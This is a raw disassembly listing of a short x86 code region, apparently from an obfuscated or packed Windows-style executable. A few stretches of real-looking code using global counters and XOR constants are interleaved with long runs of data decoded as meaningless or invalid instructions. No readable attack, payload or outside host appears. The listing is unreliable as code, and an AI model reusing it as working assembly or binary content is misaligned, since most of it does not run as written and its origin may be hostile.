  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	pop    DWORD PTR [ebx-0x13]
  40a49e:	out    dx,al
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	in     eax,dx
  40a4a8:	push   edi
  40a4a9:	cmp    DWORD PTR [edx+0x1b],ebx
  40a4ac:	jge    0x40a473
  40a4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4af:	adc    eax,0x58c53ec7
  40a4b4:	push   esp
  40a4b5:	stc    
  40a4b6:	stos   BYTE PTR es:[edi],al
  40a4b7:	adc    ebx,DWORD PTR [edx+0x33]
  40a4ba:	jne    0x40a49d
  40a4bc:	push   ss
  40a4bd:	push   esp
  40a4be:	(bad)  
  40a4bf:	push   esp
  40a4c0:	push   esp
  40a4c1:	sub    ebp,esi
  40a4c3:	int3   
  40a4c4:	sbb    DWORD PTR [eax-0x7c27bd8f],ebx
  40a4ca:	or     eax,0x9114fa38
  40a4cf:	div    ebx
  40a4d1:	loopne 0x40a54e
  40a4d3:	adc    dh,ah
  40a4d5:	dec    edx
  40a4d6:	or     al,0x13
  40a4d8:	bnd jmp 0x8614eb92
  40a4de:	xor    al,0x88
  40a4e0:	mov    ecx,0x25c3a414
  40a4e5:	xchg   ecx,eax
  40a4e6:	jge    0x40a524
  40a4e8:	jno    0x40a493
  40a4ea:	cwde   
  40a4eb:	mov    ebp,0xcfddd099
  40a4f0:	sub    al,0xe3
  40a4f2:	stos   DWORD PTR es:[edi],eax
  40a4f3:	and    edx,ecx
  40a4f5:	mov    ecx,0xe30fa4bf
  40a4fa:	ret    
  40a4fb:	ret    
  40a4fc:	push   0x9ea397b3
  40a501:	bound  esp,QWORD PTR [eax]
  40a503:	loope  0x40a4a2
  40a505:	call   0xc6686e54
  40a50a:	ds call 0x182bdd18
  40a510:	sub    DWORD PTR [edx],edx
  40a512:	xchg   BYTE PTR [eax+0x32],dl
  40a515:	mov    bh,0x85
  40a517:	je     0x40a590
  40a519:	jb     0x40a4ee
  40a51b:	inc    edx
  40a51d:	jmp    0xf0fc:0x3d60b7f9
  40a524:	adc    ch,bh
  40a526:	dec    esi
  40a527:	ret    
  40a528:	lahf   
  40a529:	pusha  
  40a52a:	pop    ebx
  40a52b:	push   edx
  40a52c:	loope  0x40a538
  40a52e:	jp     0x40a50e
  40a530:	(bad)  
  40a531:	call   FWORD PTR [ebp+0x11f023a4]
  40a537:	sar    ecx,1
  40a539:	mov    bl,0x3a
  40a53b:	pop    es
  40a53c:	sti    
  40a53d:	mov    esi,0x58d060da
  40a542:	mov    edi,DWORD PTR [esi+ecx*4]
  40a545:	addr16 pop ecx
  40a547:	adc    eax,edx
  40a549:	sub    dl,BYTE PTR [eax+eax*4-0x437ab6e4]
  40a550:	mov    ebp,0xd04112ca
  40a555:	mov    dl,0x6b
  40a557:	adc    BYTE PTR [eax-0x22],dh
  40a55a:	inc    ecx
  40a55b:	aam    0xfd
  40a55d:	mov    ds:0xe9a8490b,eax
  40a562:	ret    0xbba0
  40a565:	(bad)  [ecx-0x3b]
  40a568:	stos   DWORD PTR es:[edi],eax
  40a569:	add    BYTE PTR [ebp+edi*4+0x6e5da16a],dl
  40a570:	sti    
  40a571:	sub    DWORD PTR [ebx],0x33f76544
  40a577:	js     0x40a5f4
  40a579:	mov    esi,0x73cde9ba
  40a57e:	jge    0x40a555
  40a580:	mov    bh,0xb8
  40a582:	cwde   
  40a583:	in     eax,0xbf
  40a585:	add    ecx,DWORD PTR ds:0x3d8a400f
  40a58b:	push   DWORD PTR ds:0xcd1f04cf
  40a591:	jb     0x40a595
  40a593:	sub    eax,0x639315c3
  40a598:	pop    ecx
  40a599:	sbb    ch,BYTE PTR [esi+0x49]
  40a59c:	fnstenv [edi+eax*4]
  40a59f:	neg    BYTE PTR ds:0xac3cc0e0
  40a5a5:	icebp  
  40a5a6:	popf   
  40a5a7:	shl    DWORD PTR [ecx+0x44],0x52
  40a5ab:	adc    DWORD PTR ds:0xe52f1fea,edi
  40a5b1:	scas   eax,DWORD PTR es:[edi]
  40a5b2:	fsub   st,st(6)
  40a5b4:	sub    bh,BYTE PTR cs:[eax]
  40a5b7:	in     al,dx
  40a5b8:	ins    BYTE PTR es:[edi],dx
  40a5b9:	push   0x36
  40a5bb:	shl    BYTE PTR [ecx+ecx*2],0xcc
  40a5bf:	push   ss
  40a5c0:	or     edx,DWORD PTR [esi+edi*8+0x578abdaf]
  40a5c7:	xor    BYTE PTR [eax+0x7a],bl
  40a5ca:	jl     0x40a56c
  40a5cc:	into   
  40a5cd:	pusha  
  40a5ce:	int    0x5d
  40a5d0:	mov    eax,0xb9b2e846
  40a5d5:	adc    dh,BYTE PTR [ebx]
  40a5d7:	add    BYTE PTR [ebp+0x4a64ea30],cl
  40a5dd:	scas   eax,DWORD PTR es:[edi]
  40a5de:	xchg   esi,eax
  40a5df:	and    eax,0x1b1dc766
  40a5e4:	cmp    al,0x67
  40a5e6:	adc    eax,0x35d9c2f6
  40a5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ec:	call   0xf838:0x19416731
  40a5f3:	xchg   DWORD PTR [edx+0x7405eb1b],ecx
  40a5f9:	mov    esp,0x94481ebe
  40a5fe:	xchg   ebp,eax
  40a5ff:	jle    0x40a662
  40a601:	pop    ds
  40a602:	jecxz  0x40a640
  40a604:	aad    0xda
  40a606:	aad    0x68
  40a608:	dec    eax
  40a609:	xchg   ecx,eax
  40a60a:	or     al,0x5
  40a60c:	push   0x1b1615c6
  40a611:	iret   
  40a612:	inc    eax
  40a613:	mov    bl,0x97
  40a615:	xor    edx,DWORD PTR [ebx-0x9]
  40a618:	lock lea ebp,[esi]
  40a61b:	dec    eax
  40a61c:	fdiv   st(2),st
  40a61e:	push   edx
  40a61f:	cmp    DWORD PTR [ebp-0xa6461d6],ebx
  40a625:	mov    BYTE PTR ds:0x93b32b4a,al
  40a62b:	mov    DWORD PTR [ebx+edx*1],ebx
  40a62e:	add    BYTE PTR [ebx],0x44
  40a631:	fsub   QWORD PTR [esi+0x2]
  40a634:	sub    edx,ebp
  40a636:	test   al,0x29
  40a638:	aam    0x3f
  40a63a:	cli    
  40a63b:	leave  
  40a63c:	fwait
  40a63d:	xchg   BYTE PTR [edi],dl
  40a63f:	icebp  
  40a640:	lods   al,BYTE PTR ds:[esi]
  40a641:	push   ecx
  40a642:	clc    
  40a643:	jl     0x40a657
  40a645:	dec    edx
  40a646:	js     0x40a6c4
  40a648:	pop    eax
  40a649:	cmc    
  40a64a:	in     al,dx
  40a64b:	nop
  40a64c:	jmp    0x946c:0x1f76401d
  40a653:	icebp  
  40a654:	js     0x40a684
  40a656:	cmp    DWORD PTR [ebx+0x7d6cf603],ecx
  40a65c:	pop    es
  40a65d:	out    0x3,al
  40a65f:	clc    
  40a660:	test   eax,0x20ba86e0
  40a665:	(bad)  
  40a666:	and    al,0x9b
  40a668:	mov    DWORD PTR [ebx],esi
  40a66a:	mov    bl,BYTE PTR [edi+0x385448d]
  40a670:	ret    
  40a671:	sbb    ecx,eax
  40a673:	mov    dl,0xc
  40a675:	adc    edi,ecx
  40a677:	clc    
  40a678:	sub    ch,BYTE PTR [ebx+eax*2]
  40a67b:	inc    edi
  40a67c:	inc    eax
  40a67d:	or     al,0xfa
  40a67f:	fiadd  WORD PTR [ebx-0x2e]
  40a682:	push   ss
  40a683:	add    al,BYTE PTR [edi-0x40894c00]
  40a689:	inc    eax
  40a68a:	loope  0x40a667
  40a68c:	not    BYTE PTR [ebx]
  40a68e:	lods   al,BYTE PTR ds:[esi]
  40a68f:	xor    bh,BYTE PTR [esp+ebp*4+0x68]
  40a693:	add    DWORD PTR [ecx-0x8],esi
  40a696:	cdq    
  40a697:	jae    0x40a688
  40a699:	inc    eax
  40a69a:	sbb    DWORD PTR [ecx],ebp
  40a69c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a69d:	aam    0x46
  40a69f:	fwait
  40a6a0:	les    eax,FWORD PTR [ecx+0x62]
  40a6a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6a4:	jae    0x40a6cd
  40a6a6:	pop    ss
  40a6a7:	fmulp  st(1),st
  40a6a9:	call   0xe48d:0xfe156ca2
  40a6b0:	push   cs
  40a6b1:	bound  esi,QWORD PTR [ecx+0x68]
  40a6b4:	cmp    DWORD PTR [edi+0x52],esp
  40a6b7:	repz out dx,eax
  40a6b9:	mov    BYTE PTR [edi],ah
  40a6bb:	(bad)  
  40a6bc:	jge    0x40a6c6
  40a6be:	dec    eax
  40a6bf:	pop    esp
  40a6c0:	call   0x8dcb42f1
  40a6c5:	mov    eax,0x748a2a55
  40a6ca:	ins    BYTE PTR es:[edi],dx
  40a6cb:	or     al,0x41
  40a6cd:	push   ebp
  40a6ce:	sbb    DWORD PTR [edi+0x3c19c8cc],esp
  40a6d4:	jo     0x40a66c
  40a6d6:	cld    
  40a6d7:	mov    ebx,0xd6d19f31
  40a6dc:	add    BYTE PTR [ebx],0xe7
  40a6df:	jo     0x40a691
  40a6e1:	adc    al,0x4
  40a6e3:	test   eax,0x3b26eb6f
  40a6e8:	retf   
  40a6e9:	push   ss
  40a6ea:	sub    BYTE PTR [ebp+edx*1+0x3b],bl
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x2c1eec0c
  40a7ac:	pop    es
  40a7ad:	mov    esp,0x7e7eed16
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	push   eax
  40a7b7:	push   ebx
  40a7b8:	mov    bh,0x1
  40a7ba:	(bad)  
  40a7bb:	sbb    BYTE PTR [ebx],ah
  40a7bd:	and    BYTE PTR [esi+eiz*8-0x721f02fa],dh
  40a7c4:	mov    dl,0x80
  40a7c6:	rcl    dh,0xff
  40a7c9:	test   eax,0xed852554
  40a7ce:	jnp    0x40a7cd
  40a7d0:	adc    ecx,DWORD PTR [edi-0x4b872ea6]
  40a7d6:	or     bh,BYTE PTR [eax]
  40a7d8:	mov    esp,DWORD PTR [edi-0x38d3ebef]
  40a7de:	ret    
  40a7df:	ins    DWORD PTR es:[edi],dx
  40a7e0:	jnp    0x40a763
  40a7e2:	dec    ebp
  40a7e3:	addr16 push esi
  40a7e5:	xor    eax,0x95fe4fe2
  40a7ea:	pop    ds
  40a7eb:	and    dl,BYTE PTR [ecx-0x79]
  40a7ee:	sbb    BYTE PTR [edx-0x20d79752],dh
  40a7f4:	mov    dh,0x69
  40a7f6:	js     0x40a864
  40a7f8:	call   0x7f7bfb03
  40a7fd:	imul   ebx,DWORD PTR ss:[ebx],0x62
  40a801:	loop   0x40a83d
  40a803:	fdiv   QWORD PTR [edx-0x48b90ca6]
  40a809:	jmp    0xbb06ee30
  40a80e:	scas   al,BYTE PTR es:[edi]
  40a80f:	mov    gs,WORD PTR [ebx-0x19]
  40a812:	sbb    edi,ebp
  40a814:	lds    ecx,FWORD PTR [edi-0x63]
  40a817:	aam    0x2d
  40a819:	sbb    eax,edi
  40a81b:	inc    ebx
  40a81c:	dec    ecx
  40a81d:	sar    esi,cl
  40a81f:	mov    ecx,0xad5bb8bd
  40a824:	ds mov bh,0xab
  40a827:	ds push ds
  40a829:	aad    0x59
  40a82b:	fiadd  WORD PTR [ecx]
  40a82d:	adc    edi,DWORD PTR [ebx-0x57]
  40a830:	add    BYTE PTR [eax+0x65],0xbe
  40a834:	nop
  40a835:	in     al,dx
  40a836:	les    esi,FWORD PTR [esi+esi*8+0x44ecadf7]
  40a83d:	test   DWORD PTR [ecx-0x2714989e],eax
  40a843:	das    
  40a844:	rcr    esp,1
  40a846:	stos   DWORD PTR es:[edi],eax
  40a847:	fcom   DWORD PTR [esi+0x3e86971c]
  40a84d:	dec    edx
  40a84e:	jmp    0x40a8c4
  40a850:	inc    edi
  40a851:	sub    DWORD PTR [edi+0x6c],ebx
  40a854:	or     eax,0x5a116370
  40a859:	in     eax,dx
  40a85a:	pop    ecx
  40a85b:	sub    al,BYTE PTR [esi+0x19]
  40a85e:	(bad)  
  40a85f:	loopne 0x40a7f9
  40a861:	cmp    eax,0x746c1fed
  40a866:	inc    esi
  40a867:	out    dx,eax
  40a868:	mov    ebp,0xe55e045d
  40a86d:	mov    al,0x7d
  40a86f:	xor    eax,0x956f55b0
  40a874:	loopne 0x40a8d4
  40a876:	mov    edx,0xd7a154b6
  40a87b:	js     0x40a8d2
  40a87d:	jmp    0x40a840
  40a87f:	outs   dx,DWORD PTR ds:[esi]
  40a880:	and    ch,cl
  40a882:	scas   al,BYTE PTR es:[edi]
  40a883:	and    eax,0x60433ca8
  40a888:	jae    0x40a839
  40a88a:	aam    0x3f
  40a88c:	jl     0x40a871
  40a88e:	or     eax,0x5f84fdae
  40a893:	call   0x31fb:0x1c37c30
  40a89a:	mov    edi,0xc4b9c7fc
  40a89f:	or     edx,DWORD PTR [edi+0x7]
  40a8a2:	imul   ebp,DWORD PTR [eax+0x29d3a99f],0x7d02659a
  40a8ac:	leave  
  40a8ad:	neg    DWORD PTR [edi]
  40a8af:	mov    al,BYTE PTR [edx+0xa7618b3]
  40a8b5:	jmp    0x4a212d03
  40a8ba:	sub    eax,0xf34960a8
  40a8bf:	fstp   QWORD PTR [edx-0x86c1a26]
  40a8c5:	sbb    DWORD PTR [ecx+0x4346d21d],esp
  40a8cb:	dec    edi
  40a8cc:	push   ds
  40a8cd:	int    0x1b
  40a8cf:	mov    dl,0xa2
  40a8d1:	aas    
  40a8d2:	out    0xdd,eax
  40a8d4:	cmp    BYTE PTR [esi-0x72b5339e],ah
  40a8da:	push   ss
  40a8db:	gs mov bl,cl
  40a8de:	jno    0x40a8ac
  40a8e0:	(bad)  
  40a8e2:	arpl   cx,ax
  40a8e4:	xor    eax,0x1c18a6b5
  40a8e9:	xchg   edx,eax
  40a8ea:	cld    
  40a8eb:	out    dx,al
  40a8ec:	out    0x91,al
  40a8ee:	push   ecx
  40a8ef:	int    0xc4
  40a8f1:	mov    ds:0x4bf8bc75,al
  40a8f6:	xchg   ebp,eax
  40a8f7:	jg     0x40a94f
  40a8f9:	lahf   
  40a8fa:	enter  0x77db,0xb7
  40a8fe:	repnz xor BYTE PTR [ebx],dh
  40a901:	cdq    
  40a902:	and    DWORD PTR [ecx+0x18],ecx
  40a905:	lea    ebp,[edx+edx*8-0x1b80d915]
  40a90c:	(bad)  
  40a90d:	stc    
  40a90e:	aaa    
  40a90f:	aad    0x91
  40a911:	or     BYTE PTR [eax+0x62],ch
  40a914:	ret    
  40a915:	xor    BYTE PTR [edi+0x1490cd27],0xca
  40a91c:	lds    esi,FWORD PTR [edi]
  40a91e:	fisub  DWORD PTR [ebx]
  40a920:	ss dec ebx
  40a922:	imul   esi,DWORD PTR [ecx],0xc4727911
  40a928:	fldenv [edi+0x1]
  40a92b:	clc    
  40a92c:	and    edi,DWORD PTR [esi]
  40a92e:	pop    ecx
  40a92f:	je     0x40a8de
  40a931:	outs   dx,BYTE PTR ds:[esi]
  40a932:	test   DWORD PTR [ecx+0x611aded3],esi
  40a938:	sub    BYTE PTR [edx+eiz*2+0x7197fffe],bh
  40a93f:	sahf   
  40a940:	inc    edx
  40a941:	cmp    al,0xa8
  40a943:	or     BYTE PTR [esi-0x67],al
  40a946:	xchg   esp,eax
  40a947:	and    eax,0xe1a7fdd8
  40a94c:	in     al,dx
  40a94d:	pop    ebp
  40a94e:	ja     0x40a9ba
  40a950:	fs push 0x7aa7d6b0
  40a956:	in     al,dx
  40a957:	test   al,0x91
  40a959:	sbb    dl,BYTE PTR [ecx+ebx*8]
  40a95c:	pop    ds
  40a95d:	add    eax,0x1513825f
  40a962:	test   al,0x10
  40a964:	jo     0x40a9a8
  40a966:	mov    ebx,0x965f6faf
  40a96b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a96c:	mov    WORD PTR [edi],?
  40a96e:	xchg   ecx,eax
  40a96f:	nop
  40a970:	shl    BYTE PTR [ecx-0x45e7e057],1
  40a976:	inc    ebx
  40a977:	ficom  WORD PTR [ebx+0x5f]
  40a97a:	mov    edi,0x26abd26d
  40a97f:	or     eax,0xd73540b8
  40a984:	shl    BYTE PTR [edi+0x71],1
  40a987:	push   es
  40a988:	popf   
  40a989:	dec    esi
  40a98a:	cli    
  40a98b:	ret    0xf428
  40a98e:	jecxz  0x40a9c6
  40a990:	sub    ebp,DWORD PTR [ebx+0x7bf85f75]
  40a996:	xchg   edi,eax
  40a997:	adc    eax,0x4f77aabe
  40a99c:	jns    0x40a936
  40a99e:	pushf  
  40a99f:	das    
  40a9a0:	lds    eax,FWORD PTR [ecx-0x74]
  40a9a3:	mov    esi,0xa9db7659
  40a9a8:	retf   
  40a9a9:	loopne 0x40a981
  40a9ab:	jg     0x40aa28
  40a9ad:	or     eax,0x9daf0300
  40a9b2:	sbb    BYTE PTR [ebx],ah
  40a9b4:	stos   BYTE PTR es:[edi],al
  40a9b5:	mov    ah,0x75
  40a9b7:	xchg   ecx,eax
  40a9b8:	cmc    
  40a9b9:	or     dl,cl
  40a9bb:	in     eax,dx
  40a9bc:	mov    edx,0x141adb1
  40a9c1:	call   0xffbd:0x1ab8af0d
  40a9c8:	jmp    0xabac1918
  40a9cd:	popa   
  40a9ce:	mov    bl,BYTE PTR [esp+eax*2-0x74719b40]
  40a9d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9d6:	sbb    DWORD PTR [ebx+0x61],ebx
  40a9d9:	jnp    0x40a97f
  40a9db:	xchg   ebp,eax
  40a9dc:	jge    0x40a9fe
  40a9de:	xor    al,0xe3
  40a9e0:	push   0xc6e82590
  40a9e5:	out    dx,al
  40a9e6:	popa   
  40a9e7:	dec    eax
  40a9e8:	out    0xc0,al
  40a9ea:	es jns 0x40a9ec
  40a9ed:	adc    eax,0xce6699df
  40a9f2:	and    DWORD PTR [edx],esp
  40a9f4:	push   ss
  40a9f5:	aas    
  40a9f6:	adc    esp,DWORD PTR [edi+0x49]
  40a9f9:	imul   esp,ebx,0xec4589fb
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	adc    BYTE PTR [ecx],dl
  40aa36:	cmp    DWORD PTR [edx+0x7e7eebd0],ecx
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	ss dec edi
  40aa42:	cli    
  40aa43:	mov    esi,0x9498dcc8
  40aa48:	loop   0x40aa04
  40aa4a:	cs jae 0x40aa6e
  40aa4d:	adc    BYTE PTR [ebp-0x687e8784],0xcf
  40aa54:	inc    esi
  40aa55:	rcl    DWORD PTR [esi+0x7f],1
  40aa58:	or     DWORD PTR [eax+0x45],eax
  40aa5b:	mov    al,BYTE PTR ds:0x68ba80e9
  40aa61:	mov    dh,0x80
  40aa63:	and    dl,ch
  40aa65:	cli    
  40aa66:	mov    eax,0x60da7be0
  40aa6b:	xor    ch,BYTE PTR [ebx-0x3d]
  40aa6e:	out    dx,eax
  40aa6f:	inc    ebp
  40aa70:	adc    dh,BYTE PTR [edi]
  40aa72:	pop    ebx
  40aa73:	pop    ebx
  40aa74:	dec    ecx
  40aa75:	push   ebp
  40aa76:	push   esi
  40aa77:	add    eax,0x19fc6c6e
  40aa7c:	mov    cl,0x81
  40aa7e:	push   ecx
  40aa7f:	ror    bl,cl
  40aa81:	popa   
  40aa82:	cmp    cl,cl
  40aa84:	in     al,dx
  40aa85:	ja     0x40aa95
  40aa87:	xor    ebp,0xffffffde
  40aa8a:	add    BYTE PTR [edi+0x73],bh
  40aa8d:	cdq    
  40aa8e:	add    al,0xa4
  40aa90:	cmp    bh,BYTE PTR [edx+ebx*8-0x78]
  40aa94:	les    ecx,FWORD PTR [edx+eax*1+0x66]
  40aa98:	scas   al,BYTE PTR es:[edi]
  40aa99:	test   BYTE PTR [eax],bh
  40aa9b:	inc    ecx
  40aa9c:	xchg   esi,eax
  40aa9d:	push   cs
  40aa9e:	dec    ecx
  40aa9f:	push   ds
  40aaa0:	pop    es
  40aaa1:	js     0x40aadd
  40aaa3:	out    dx,eax
  40aaa4:	div    BYTE PTR [eax+0x24]
  40aaa7:	outs   dx,BYTE PTR ds:[esi]
  40aaa8:	bound  edx,QWORD PTR [edi]
  40aaaa:	pop    ss
  40aaab:	aad    0xac
  40aaad:	js     0x40aafd
  40aaaf:	shl    DWORD PTR [esi],0x7c
  40aab2:	jge    0x40aa7d
  40aab4:	pop    ebx
  40aab5:	stc    
  40aab6:	fmul   st(4),st
  40aab8:	loop   0x40aa8f
  40aaba:	inc    eax
  40aabb:	sub    BYTE PTR [ecx],bl
  40aabd:	imul   ebp,DWORD PTR [edi-0x56c6b9d6],0x231f3e01
  40aac7:	in     al,0x33
  40aac9:	jnp    0x40aa76
  40aacb:	inc    ebx
  40aacc:	xchg   ebp,eax
  40aacd:	js     0x40ab27
  40aacf:	sub    eax,0xda0e9cf2
  40aad4:	mov    ds:0x82df8073,al
  40aad9:	stc    
  40aada:	jg     0x40aaf2
  40aadc:	shl    BYTE PTR [eax],0xe2
  40aadf:	or     al,0xf4
  40aae2:	mov    dh,0x62
  40aae4:	cmp    ecx,DWORD PTR [edx-0x7f]
  40aae7:	sbb    al,0x9
  40aae9:	neg    DWORD PTR [edi+0x4c]
  40aaec:	pop    ss
  40aaed:	clc    
  40aaee:	mov    dh,0xe7
  40aaf0:	dec    esi
  40aaf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaf2:	sbb    al,0xbd
  40aaf4:	ret    0x2213
  40aaf7:	fbld   TBYTE PTR [ebp+0x2684b03a]
  40aafd:	dec    ebp
  40aafe:	push   0xffffffb3
  40ab00:	aaa    
  40ab01:	stos   BYTE PTR es:[edi],al
  40ab02:	add    esi,DWORD PTR [ecx+edx*2]
  40ab05:	sbb    al,0xc5
  40ab07:	fisttp DWORD PTR [eax]
  40ab09:	fistp  DWORD PTR [esi*1-0x10b57cba]
  40ab10:	add    eax,0x5ec3c3f6
  40ab15:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40ab17:	(bad)  
  40ab18:	push   ss
  40ab19:	xor    al,0x46
  40ab1b:	cmp    eax,0x363d8689
  40ab20:	outs   dx,DWORD PTR ds:[esi]
  40ab21:	rcr    DWORD PTR [eax-0x44f2f140],0xe
  40ab28:	push   eax
  40ab29:	cmc    
  40ab2a:	in     al,dx
  40ab2b:	(bad)  
  40ab2c:	outs   dx,DWORD PTR ds:[esi]
  40ab2d:	ins    BYTE PTR es:[edi],dx
  40ab2e:	es pushf 
  40ab30:	ja     0x40ab72
  40ab32:	sub    eax,0x72199a3d
  40ab37:	or     ecx,DWORD PTR [ebx-0x4d]
  40ab3a:	dec    ebx
  40ab3b:	out    dx,al
  40ab3c:	adc    eax,0x275f0fd3
  40ab41:	jns    0x40aad3
  40ab43:	mov    ebx,0x735fac07
  40ab48:	mov    BYTE PTR [ecx-0x6f55cbe0],ah
  40ab4e:	push   0xa7798812
  40ab53:	stos   DWORD PTR es:[edi],eax
  40ab54:	cld    
  40ab55:	inc    ecx
  40ab56:	pop    edx
  40ab57:	push   ebp
  40ab58:	xchg   DWORD PTR [esi+edx*8-0x557c194],edx
  40ab5f:	scas   al,BYTE PTR es:[edi]
  40ab60:	(bad)  
  40ab61:	into   
  40ab62:	push   ds
  40ab63:	xchg   edi,eax
  40ab64:	push   eax
  40ab65:	and    BYTE PTR [esi+0x1cbb80b1],0x9
  40ab6c:	int    0xd0
  40ab6e:	or     al,0xd2
  40ab70:	mov    esi,0x4d3eabed
  40ab75:	in     eax,dx
  40ab76:	add    al,0xc5
  40ab78:	mov    cl,0xeb
  40ab7a:	xchg   ebp,eax
  40ab7b:	lods   eax,DWORD PTR ds:[esi]
  40ab7c:	outs   dx,DWORD PTR ds:[esi]
  40ab7d:	jnp    0x40aba2
  40ab7f:	(bad)  
  40ab81:	cdq    
  40ab82:	push   es
  40ab83:	imul   esi,DWORD PTR [edx+0x6d3155a8],0xffffffe4
  40ab8a:	nop
  40ab8b:	lea    ecx,ds:0x3876a86a
  40ab91:	sub    eax,0x6965d28d
  40ab96:	es xchg edx,eax
  40ab98:	mov    bh,0x85
  40ab9a:	rcr    BYTE PTR [eax-0x1],0x33
  40ab9e:	out    dx,al
  40ab9f:	push   ds
  40aba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aba1:	repz leave 
  40aba3:	pushf  
  40aba4:	pop    es
  40aba5:	push   0xe
  40aba7:	retf   
  40aba8:	pop    ss
  40aba9:	retf   0x4a65
  40abac:	stc    
  40abad:	mov    dh,0x58
  40abaf:	out    0xd2,eax
  40abb1:	lods   eax,DWORD PTR ds:[esi]
  40abb2:	mov    cl,0xef
  40abb4:	scas   al,BYTE PTR es:[edi]
  40abb5:	dec    ebp
  40abb6:	xchg   esp,ebx
  40abb8:	fisub  WORD PTR [esi-0x4dbf8387]
  40abbe:	gs dec ebp
  40abc0:	dec    ebx
  40abc1:	in     eax,0xb
  40abc3:	xor    al,0x82
  40abc5:	inc    eax
  40abc6:	mov    ah,0xf0
  40abc8:	call   0x8741:0x7955990f
  40abcf:	mov    bl,0x15
  40abd1:	mov    dl,0x24
  40abd3:	cmp    eax,eax
  40abd5:	xchg   BYTE PTR [edi-0xa],al
  40abd8:	fcomp  DWORD PTR [esi]
  40abda:	cmp    dh,ch
  40abdc:	stos   BYTE PTR es:[edi],al
  40abdd:	fmul   DWORD PTR [ebp-0x12]
  40abe0:	mov    esp,0xe1b292d6
  40abe5:	mov    bl,0xf
  40abe7:	xchg   edi,eax
  40abe8:	mov    dh,0xf0
  40abea:	adc    bh,BYTE PTR [edi+0x4]
  40abed:	cld    
  40abee:	cli    
  40abef:	test   eax,0x1ef63ca4
  40abf4:	lea    ebp,[eax-0x42]
  40abf7:	push   ebp
  40abf8:	inc    eax
  40abf9:	add    al,0xe2
  40abfb:	inc    edi
  40abfc:	sti    
  40abfd:	cwde   
  40abfe:	sub    al,BYTE PTR [edx+0x3c]
  40ac01:	xchg   ebx,eax
  40ac02:	or     ebx,edi
  40ac04:	ss sub al,0x8e
  40ac07:	shl    BYTE PTR [edx-0x67],0x6f
  40ac0b:	mov    al,fs:0x7183deb3
  40ac11:	cwde   
  40ac12:	sbb    al,BYTE PTR [edi-0x1e]
  40ac15:	enter  0x2e7b,0x75
  40ac19:	ins    BYTE PTR es:[edi],dx
  40ac1a:	mov    ds:0xdaec888e,al
  40ac1f:	or     BYTE PTR [ecx-0x2f6ff3c1],dh
  40ac25:	(bad)  
  40ac26:	mov    ecx,0xbc2dd505
  40ac2b:	stos   DWORD PTR es:[edi],eax
  40ac2c:	xchg   edi,eax
  40ac2d:	push   es
  40ac2e:	stos   BYTE PTR es:[edi],al
  40ac2f:	push   cs
  40ac30:	sahf   
